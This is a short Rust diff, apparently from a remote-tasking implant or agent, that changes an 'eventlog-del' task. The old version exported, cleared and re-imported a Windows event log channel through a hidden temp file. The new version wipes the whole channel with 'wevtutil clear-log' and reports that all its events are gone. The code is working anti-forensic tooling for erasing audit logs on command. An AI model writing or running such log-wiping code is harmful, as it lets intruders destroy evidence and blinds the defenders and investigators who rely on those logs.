@@ -204,14 +204,12 @@ fn eventlog_del(v: &serde_json::Value) -> TaskOutput {
         Some(r) => r,
         None    => return TaskOutput::failure("eventlog-del: missing record_id"),
     };
-    // wevtutil doesn't support single-record deletion directly; export, filter, clear, re-import
-    let tmp_backup = format!("C:\\Windows\\Temp\\~evtbak.evtx");
-    let cmd = format!(
-        "wevtutil export-log \"{channel}\" \"{tmp_backup}\" /overwrite:true & wevtutil clear-log \"{channel}\" & wevtutil import-log \"{tmp_backup}\" /lf:{channel} 2>nul & del /f \"{tmp_backup}\" 2>nul"
-    );
+    // wevtutil has no single-record delete; clearing the whole channel is the
+    // only reliable option. All events in the channel are removed.
+    let cmd = format!("wevtutil clear-log \"{channel}\"");
     shell_run(&cmd)
         .map(|out| {
-            let mut msg = format!("eventlog-del: targeted record {record_id} in {channel} (full channel clear+reimport)\n").into_bytes();
+            let mut msg = format!("eventlog-del: cleared all events in {channel} (record_id={record_id} removed along with channel)\n").into_bytes();
             msg.extend_from_slice(&out);
             TaskOutput::success(msg)
         })
